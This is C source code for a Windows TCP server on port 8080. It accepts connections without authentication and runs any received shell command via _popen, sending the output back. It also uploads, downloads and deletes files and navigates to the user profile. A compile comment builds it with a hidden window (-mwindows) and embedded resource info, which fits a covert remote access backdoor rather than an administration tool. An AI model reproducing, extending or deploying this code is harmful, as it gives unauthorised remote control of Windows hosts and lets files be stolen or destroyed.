#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <direct.h>
#include <stdint.h>
#include <stdbool.h>

#define PORT 8080
#define BUFFER_SIZE 4096
#define TIMEOUT_SECONDS 5

void handle_error(const char*);

void removeFile(SOCKET, const char *);

int32_t receive_with_timeout(SOCKET, char*, int32_t, int32_t);

void send_file(SOCKET, const char*);

void download_file(SOCKET, const char*);

int32_t handle_client(SOCKET);

int32_t main(void) {
    WSADATA wsaData;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int32_t client_addr_len = sizeof(client_addr);
	
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("[-] WSAStartup failed");
        return 1;
    }

    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        perror("[-] Socket creation failed");
        WSACleanup();
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        perror("[-] Bind failed");
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    if (listen(server_socket, 5) == SOCKET_ERROR) {
        perror("[-] Listen failed");
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    printf("[+] Server listening on port %d...\n", PORT);

    while (true) {
        if ((client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_addr_len)) == INVALID_SOCKET) {
            perror("[-] Accept failed");
            break;
        }

        printf("[+] Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        handle_client(client_socket);
    }

    closesocket(client_socket);
    WSACleanup();

    return 0;
}
// Compile: clang -Wall -Wextra -Wpedantic -Wconversion -fsanitize=address server.c -o server -lws2_32 -lgdi32 -mwindows
// Complile info file: llvm-windres server.rc -O coff -o server.res
// clang server.c server.res -o server -lws2_32 -lgdi32
void handle_error(const char* error_message) {
    fprintf(stderr, "Error: %s\n", error_message);
}

void removeFile(SOCKET client_socket, const char *filename) {
    if (remove(filename) == 0) {
        printf("[+] File '%s' removed successfully.\n", filename);
		send(client_socket, "[+] File removed successfully.\n", 32, 0);
    } else {
        perror("[-] Error removing file");
		send(client_socket, "[-] Error removing file\n", 25, 0);
    }
}

int32_t receive_with_timeout(SOCKET socket, char* buffer, int32_t buffer_size, int32_t timeout_seconds) {
    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(socket, &read_fds);

    struct timeval timeout;
    timeout.tv_sec = timeout_seconds;
    timeout.tv_usec = 0;

    int32_t result = select(socket + 1, &read_fds, NULL, NULL, &timeout);
    if (result == SOCKET_ERROR) {
        return SOCKET_ERROR;
    } else if (result == 0) {
        return 0;
    }

    int32_t received_bytes = recv(socket, buffer, buffer_size, 0);
    return received_bytes;
}

void send_file(SOCKET client_socket, const char* filename) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        send(client_socket, "File not found.\n", 17, 0);
        return;
    }

    fseek(file, 0, SEEK_END);
    size_t file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Send the length of the file to the client
    int32_t file_length = htonl(file_size);
    send(client_socket, (char*)&file_length, sizeof(file_length), 0);

    char buffer[BUFFER_SIZE];
    size_t bytesRead;
	size_t totalBytesSent = 0;
	
    // Read and send the file in chunks
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        if (send(client_socket, buffer, bytesRead, 0) == -1) {
            perror("Error sending file data");
            fclose(file);
            return;
        }
        totalBytesSent += bytesRead;

        int32_t percentage = (int32_t)((double)totalBytesSent / file_size * 100);
        printf("Sending... %d%%\r", percentage);
        fflush(stdout);
    }

    fclose(file);
    printf("[+] File '%s' sent successfully!\n", filename);
}

void download_file(SOCKET client_socket, const char* filename) {
    char buffer[BUFFER_SIZE];
    int32_t file_length;

    if (receive_with_timeout(client_socket, (char*)&file_length, sizeof(file_length), TIMEOUT_SECONDS) <= 0) {
        printf("Timeout reached. No response from the client.\n");
        return;
    }

    file_length = ntohl(file_length);

    FILE* file = fopen(filename, "wb");
    if (!file) {
        handle_error("[-] Error opening file");
        return;
    }

    int32_t total_received_bytes = 0;
    int32_t received_bytes;

    // Receive and display progress in percentage
    while (total_received_bytes < file_length) {
        received_bytes = receive_with_timeout(client_socket, buffer, sizeof(buffer), TIMEOUT_SECONDS);
        if (received_bytes <= 0) {
            printf("[-] Timeout reached. No response from the client.\n");
            fclose(file);
            remove(filename);
            return;
        }

        fwrite(buffer, 1, received_bytes, file);
        total_received_bytes += received_bytes;

        int32_t percentage = (int32_t)((double)total_received_bytes / file_length * 100);
        printf("Downloading... %d%%\r", percentage);
        fflush(stdout);
    }

    printf("[+] File '%s' downloaded successfully!\n", filename);

    fclose(file);
}

int32_t handle_client(SOCKET client_socket) {
    char buffer[BUFFER_SIZE];

    while (true) {
        memset(buffer, 0, sizeof(buffer));

        if (recv(client_socket, buffer, sizeof(buffer), 0) <= 0) {
            perror("[-] Command receive failed");
            break;
        }

        printf("Received command: %s\n", buffer);
		
		if (strcmp(buffer, "terminate\n") == 0) {
			perror("[-] Termination command given!");
			closesocket(client_socket);
			WSACleanup();
			return 1;
		}

		if (strncmp(buffer, "cd ", 3) == 0) {
			char directory[BUFFER_SIZE];
			sscanf(buffer, "cd %[^\n]", directory);

			if (strncmp(directory, "%userprofile%", 13) == 0) {
				char* userProfile = getenv("USERPROFILE");

				if (userProfile == NULL) {
					send(client_socket, "Failed to change directory.\n", 29, 0);
				} else {
					char absolutePath[BUFFER_SIZE];
					snprintf(absolutePath, sizeof(absolutePath), "%s%s", userProfile, directory + 13);

					if (chdir(absolutePath) == 0) {
						send(client_socket, "Directory changed successfully.\n", 33, 0);
					} else {
						send(client_socket, "Failed to change directory.\n", 29, 0);
					}
				}
			} else {
				if (chdir(directory) == 0) {
					send(client_socket, "Directory changed successfully.\n", 33, 0);
				} else {
					send(client_socket, "Failed to change directory.\n", 29, 0);
				}
			}
			continue;
		} else if (strncmp(buffer, "download ", 9) == 0) {
            char filename[BUFFER_SIZE];
            sscanf(buffer, "download %[^\n]", filename);
            send_file(client_socket, filename);
            continue;
        } else if (strncmp(buffer, "send ", 5) == 0) {
            char filename[BUFFER_SIZE];
            sscanf(buffer, "send %[^\n]", filename);
            download_file(client_socket, filename);
            continue;
		} else if(strncmp(buffer, "remove ", 7) == 0) {
				char filename[BUFFER_SIZE];
				sscanf(buffer, "remove %[^\n]", filename);
				removeFile(client_socket, filename);
				continue;
		}
		
		FILE* command_output = _popen(buffer, "r");
		if (command_output == NULL) {
			send(client_socket, "[-] Execution failed.\n", 23, 0);
			perror("[-] Execution failed");
			break;
		}

		// Read the output of the command into a buffer
		size_t total_size = 0;
		char* output_buffer = NULL;

		while (fgets(buffer, sizeof(buffer), command_output) != NULL) {
			size_t line_length = strlen(buffer);

			// Allocate or resize the output buffer
			char* new_output_buffer = (char*)realloc(output_buffer, total_size + line_length + 1);
			if (new_output_buffer == NULL) {
				perror("[-] Memory allocation failed");
				free(output_buffer);  
				break;
			}

			output_buffer = new_output_buffer;  
			// Copy the current line to the output buffer
			strcpy(output_buffer + total_size, buffer);
			total_size += line_length;
		}

		int32_t command_status = _pclose(command_output);
		if (command_status != 0) {
			send(client_socket, "[-] Execution error.\n", 22, 0);
		} else {
			// Send the length of the output first
			int32_t message_length = htonl(total_size);
			send(client_socket, (char*)&message_length, sizeof(message_length), 0);

			if (output_buffer != NULL) {
				send(client_socket, output_buffer, total_size, 0);
				free(output_buffer);  
			} else {
				send(client_socket, "[+] Execution complete.\n", 25, 0);
			}
		}
	}
    
	closesocket(client_socket);
	return 1;
}
